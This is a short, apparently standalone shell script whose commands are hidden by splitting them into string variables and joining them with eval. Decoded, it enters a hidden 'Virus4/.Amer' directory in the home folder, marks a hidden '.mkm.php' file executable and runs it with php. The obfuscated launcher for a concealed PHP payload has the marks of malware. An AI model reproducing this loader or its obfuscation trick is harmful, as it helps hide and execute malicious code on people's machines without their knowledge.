z="
";Cz='/Vir';Gz='chmo';Lz='php ';Ez='.Ame';Jz='m.ph';Hz='d +x';Mz='.mkm';Kz='p';Az='cd $';Dz='us4/';Bz='HOME';Fz='r';Nz='.php';Iz=' .mk';
eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$Hz$Iz$Jz$Kz$z$Lz$Mz$Nz"